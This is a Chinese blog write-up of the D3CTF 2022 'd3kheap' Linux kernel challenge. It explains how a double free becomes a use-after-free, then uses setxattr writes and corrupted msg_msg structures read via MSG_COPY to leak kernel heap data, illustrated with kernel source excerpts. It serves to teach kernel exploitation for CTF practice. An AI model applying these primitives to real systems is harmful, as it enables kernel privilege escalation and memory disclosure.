@@ -1,0 +1,802 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/browser.jpg">
+  <link rel="icon" href="/img/browser.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="korey0sh1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00：写在一切之前通过A3👴2022年D3CTF上的d3kheap来巩固一下最近所学 0x01：题目分析逻辑很简单，能分配一次0x400大小的object，且因为ref_count的错误初始化，能释放两次此object，故存在UAF  0x02：漏洞利用构造UAF先分配0x400的object 释放 利用结构体分配到到原先释放的object 再次释放此object 解法一：利用 setxat">
+<meta property="og:type" content="article">
+<meta property="og:title" content="d3kheap">
+<meta property="og:url" content="http://example.com/2024/02/15/d3kheap/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00：写在一切之前通过A3👴2022年D3CTF上的d3kheap来巩固一下最近所学 0x01：题目分析逻辑很简单，能分配一次0x400大小的object，且因为ref_count的错误初始化，能释放两次此object，故存在UAF  0x02：漏洞利用构造UAF先分配0x400的object 释放 利用结构体分配到到原先释放的object 再次释放此object 解法一：利用 setxat">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240216094551.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/25/5fOESRbu6Zan7mU.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/25/SXBzMHaNqKLmPTG.png">
+<meta property="article:published_time" content="2024-02-15T15:09:52.000Z">
+<meta property="article:modified_time" content="2024-03-04T11:34:44.582Z">
+<meta property="article:author" content="korey0sh1">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240216094551.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>d3kheap - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>korey0sh1</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/achieve_page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="d3kheap"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        korey0sh1
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-15 23:09" pubdate>
+          2024年2月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.9k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">d3kheap</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2024年3月4日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="0x00：写在一切之前"><a href="#0x00：写在一切之前" class="headerlink" title="0x00：写在一切之前"></a>0x00：写在一切之前</h1><p>通过A3👴2022年D3CTF上的d3kheap来巩固一下最近所学</p>
+<h1 id="0x01：题目分析"><a href="#0x01：题目分析" class="headerlink" title="0x01：题目分析"></a>0x01：题目分析</h1><p>逻辑很简单，能分配一次0x400大小的object，且因为ref_count的错误初始化，能释放两次此object，故存在UAF</p>
+<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240216094551.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="0x02：漏洞利用"><a href="#0x02：漏洞利用" class="headerlink" title="0x02：漏洞利用"></a>0x02：漏洞利用</h1><h2 id="构造UAF"><a href="#构造UAF" class="headerlink" title="构造UAF"></a>构造UAF</h2><p>先分配0x400的object</p>
+<p>释放</p>
+<p>利用结构体分配到到原先释放的object</p>
+<p>再次释放此object</p>
+<h2 id="解法一：利用-setxattr-多次劫持-msg-msg"><a href="#解法一：利用-setxattr-多次劫持-msg-msg" class="headerlink" title="解法一：利用 setxattr 多次劫持 msg_msg"></a>解法一：利用 setxattr 多次劫持 msg_msg</h2><h3 id="Step-I-setxattr-修改-object-内容"><a href="#Step-I-setxattr-修改-object-内容" class="headerlink" title="Step.I setxattr 修改 object 内容"></a>Step.I setxattr 修改 object 内容</h3><p>接下来我们思考如何对一个 free 状态的 object 内写入数据，这里笔者要向大家介绍一个名为 setxattr 的系统调用（对内核安全稍有研究的同学应该都接触过）</p>
+<p>setxattr 是一个十分独特的系统调用族，抛开其本身的功能，在 kernel 的利用当中他可以为我们提供<strong>近乎任意大小的内核空间 object 分配</strong></p>
+<p>观察 setxattr 源码，发现如下调用链：</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">SYS_setxattr</span>()<br>    <span class="hljs-built_in">path_setxattr</span>()<br>        <span class="hljs-built_in">setxattr</span>()<br></code></pre></td></tr></table></figure>
+
+<p>在 <code>setxattr()</code> 函数中有如下逻辑：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">setxattr</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dentry *d, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *value,</span><br><span class="hljs-params">     <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>        kvalue = kvmalloc(size, GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvalue)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        <span class="hljs-keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;<br><br>    <span class="hljs-comment">//,..</span><br><br>    kvfree(kvalue);<br><br>    <span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容</strong>，完成写入之后该 object 又会通过 kvfree 被释放掉，因此我们便可以通过 setxattr <strong>多次修改 victim 的内容</strong></p>
+<p>不够完美的一点是，slub 中 free 的 object 同样是连接成一个单向链表，因此我们无法控制该 object 中 <code>kmem_cache-&gt;offset</code> 偏移处的 8 字节的内容，但这个 offset 的存在<strong>也从另一个侧面提供给了我们便利</strong>，在接下来的利用中你会看到这一点</p>
+<p>可能有的人还会想到 userfaultfd + setxattr 这一技术，或许可以利用这个技术劫持 freelist 完成任意地址分配与任意地址写？但是<strong>自从内核版本 5.11 起，userfaultfd 被限制为默认情况下只有 root 权限才能使用</strong>，因此这条路暂时是走不通的，我们接下来要找一个不是特别受分配大小影响的结构体</p>
+<h3 id="Step-II-msg-msg-搜索内存完成地址泄露"><a href="#Step-II-msg-msg-搜索内存完成地址泄露" class="headerlink" title="Step.II msg_msg 搜索内存完成地址泄露"></a>Step.II msg_msg 搜索内存完成地址泄露</h3><p>现在我们有了「写的原语」，接下来我们要寻找「读的原语」，在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：</p>
+<ul>
+<li>msgget：创建一个消息队列</li>
+<li>msgsnd：向指定消息队列发送消息</li>
+<li>msgrcv：从指定消息队列接接收消息</li>
+</ul>
+<p>当我们创建一个消息队列时，在内核空间中会创建这样一个结构体，其表示一个消息队列：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* one msq_queue structure for each present queue on the system */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kern_ipc_perm</span> <span class="hljs-title">q_perm</span>;</span><br>	<span class="hljs-type">time64_t</span> q_stime;		<span class="hljs-comment">/* last msgsnd time */</span><br>	<span class="hljs-type">time64_t</span> q_rtime;		<span class="hljs-comment">/* last msgrcv time */</span><br>	<span class="hljs-type">time64_t</span> q_ctime;		<span class="hljs-comment">/* last change time */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_cbytes;		<span class="hljs-comment">/* current number of bytes on queue */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qnum;		<span class="hljs-comment">/* number of messages in queue */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qbytes;		<span class="hljs-comment">/* max number of bytes on queue */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lspid</span>;</span>		<span class="hljs-comment">/* pid of last msgsnd */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lrpid</span>;</span>		<span class="hljs-comment">/* last receive pid */</span><br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_messages</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_receivers</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_senders</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>
+
+<p>而当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>	<span class="hljs-type">long</span> m_type;<br>	<span class="hljs-type">size_t</span> m_ts;		<span class="hljs-comment">/* message text size */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br>	<span class="hljs-type">void</span> *security;<br>	<span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>在内核当中这两个结构体形成一个如下结构的循环双向链表：</p>
+<p><a target="_blank" rel="noopener" href="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png"><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>若是消息队列中只有一个消息则是这样：</p>
+<p><a target="_blank" rel="noopener" href="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png"><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>接下来我们来深入 msg_msg 的内部结构，阅读 msgsnd 源码可知，当我们在消息队列上发送一个 message 时，其首先会调用 <code>load_msg</code> 将该 message 拷贝到内核中</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title">do_msgsnd</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">long</span> mtype, <span class="hljs-type">void</span> __user *mtext,</span></span><br><span class="hljs-params"><span class="hljs-function">		<span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">int</span> msgflg)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">msg_queue</span> *msq;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">msg_msg</span> *msg;<br>	<span class="hljs-type">int</span> err;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ipc_namespace</span> *ns;<br>	<span class="hljs-built_in">DEFINE_WAKE_Q</span>(wake_q);<br><br>	ns = current-&gt;nsproxy-&gt;ipc_ns;<br><br>	<span class="hljs-keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="hljs-type">long</span>) msgsz &lt; <span class="hljs-number">0</span> || msqid &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">return</span> -EINVAL;<br>	<span class="hljs-keyword">if</span> (mtype &lt; <span class="hljs-number">1</span>)<br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	msg = <span class="hljs-built_in">load_msg</span>(mtext, msgsz);<br>    <br>    <span class="hljs-comment">//...</span><br><br>C<br></code></pre></td></tr></table></figure>
+
+<p>而 <code>load_msg()</code> 最终会调用到 <code>alloc_msg()</code> 分配所需的空间</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">msg_msg</span> *<span class="hljs-built_in">load_msg</span>(<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *src, <span class="hljs-type">size_t</span> len)<br>&#123;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">msg_msg</span> *msg;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">msg_msgseg</span> *seg;<br>	<span class="hljs-type">int</span> err = -EFAULT;<br>	<span class="hljs-type">size_t</span> alen;<br><br>	msg = <span class="hljs-built_in">alloc_msg</span>(len);<br><br>C<br></code></pre></td></tr></table></figure>
+
+<p>阅读 <code>alloc_msg()</code> 源码可以发现，其以 msg_msg 结构体为核心生成如下结构：</p>
+<ul>
+<li>对于大小在【一个页面再减掉作为 header 的 msg_msg 的 size】范围内的数据而言，内核仅会分配一个 size + header size 大小的 object（通过 kmalloc），其前 0x30 大小的部分存放 msg_msg 这一 header，剩余部分用以存放用户数据</li>
+<li>对于大小超出【一个页面再减掉作为 header 的 msg_msg 的 size】范围的数据而言，其会额外生成 <code>msg_msgseg</code> 结构体来存放用户数据，通过 kmalloc 分配，大小为剩余未拷贝的用户数据大小加上 next 指针；该结构体与 msg_msg 的 next 成员形成一个<strong>单向链表</strong>，其前 8 字节存放指向下一个 msg_msgseg 的指针，若无则为 NULL</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png"><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>我们不难想到的是，我们可以分配一个大小为 1024 的 msg_msg 结构体作为 victim，利用 setxattr 系统调用修改其 header 中的 <code>m_ts</code> 成员，<strong>从而实现堆上的越界数据读取</strong>，同时还能通过修改 msg_msg-&gt;next <strong>实现任意地址读</strong></p>
+<p>但是这样有一个问题，当我们调用 msgrcv 接受消息时，其会调用 <code>list_del()</code> 将对应的 msg_msg 结构体从双向链表中 unlink，<strong>此时我们并不知道内核空间中的任何地址，因此内核会在 unlink 时 panic 掉</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgrcv</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> __user *buf, <span class="hljs-type">size_t</span> bufsz, <span class="hljs-type">long</span> msgtyp, <span class="hljs-type">int</span> msgflg,</span><br><span class="hljs-params">	       <span class="hljs-type">long</span> (*msg_handler)(<span class="hljs-type">void</span> __user *, <span class="hljs-keyword">struct</span> msg_msg *, <span class="hljs-type">size_t</span>))</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    		list_del(&amp;msg-&gt;m_list);<br>    <span class="hljs-comment">//...</span><br>    		<span class="hljs-keyword">goto</span> out_unlock0;<br>	<span class="hljs-comment">//...</span><br>out_unlock0:<br>	ipc_unlock_object(&amp;msq-&gt;q_perm);<br>	wake_up_q(&amp;wake_q);<br>out_unlock1:<br>	rcu_read_unlock();<br>	<span class="hljs-keyword">if</span> (IS_ERR(msg)) &#123;<br>		free_copy(copy);<br>		<span class="hljs-keyword">return</span> PTR_ERR(msg);<br>	&#125;<br><br>	bufsz = msg_handler(buf, msg, bufsz);<br>	free_msg(msg);<br><br>	<span class="hljs-keyword">return</span> bufsz;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>因此我们需要想一个方法既能读出 msg_msg 中数据又不会让其被非法 unlink 掉，阅读源码我们会发现，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则<strong>内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</strong>，从而我们便可以多次重复地读取同一个 <code>msg_msg</code> 结构体中数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (msgflg &amp; MSG_COPY) &#123;<br>	<span class="hljs-keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))<br>		<span class="hljs-keyword">return</span> -EINVAL;<br>	copy = prepare_copy(buf, <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, bufsz, ns-&gt;msg_ctlmax));<br>	<span class="hljs-keyword">if</span> (IS_ERR(copy))<br>		<span class="hljs-keyword">return</span> PTR_ERR(copy);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * If we are copying, then do not unlink message and do</span><br><span class="hljs-comment">		 * not update queue parameters.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (msgflg &amp; MSG_COPY) &#123;<br>			msg = copy_msg(msg, copy);<br>			<span class="hljs-keyword">goto</span> out_unlock0;<br>		&#125;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来我们考虑越界读取的详细过程，我们首先可以利用 setxattr 修改 msg_msg 的 <code>next</code> 指针为 NULL、将其 <code>m_ts</code> 改为 <code>0x1000 - 0x30</code>（在 next 指针为 NULL 的情况下，一个 msg_msg 结构体最大占用一张内存页的大小），从而越界读出内核堆上数据</p>
+<p>接下来我们思考如何进行“合法”的搜索，我们先来看 <code>copy_msg</code> 的逻辑，其拷贝时判断待数据长度的逻辑<strong>主要是看 next 指针</strong>，因此若我们的 next 指针为一个非法地址，则会在解引用时导致 kernel panic</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">copy_msg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *src, <span class="hljs-keyword">struct</span> msg_msg *dst)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">dst_pseg</span>, *<span class="hljs-title">src_pseg</span>;</span><br>	<span class="hljs-type">size_t</span> len = src-&gt;m_ts;<br>	<span class="hljs-type">size_t</span> alen;<br><br>	<span class="hljs-keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)<br>		<span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><br>	alen = min(len, DATALEN_MSG);<br>	<span class="hljs-built_in">memcpy</span>(dst + <span class="hljs-number">1</span>, src + <span class="hljs-number">1</span>, alen);<br><br>	<span class="hljs-keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;<br>	     src_pseg != <span class="hljs-literal">NULL</span>;<br>	     dst_pseg = dst_pseg-&gt;next, src_pseg = 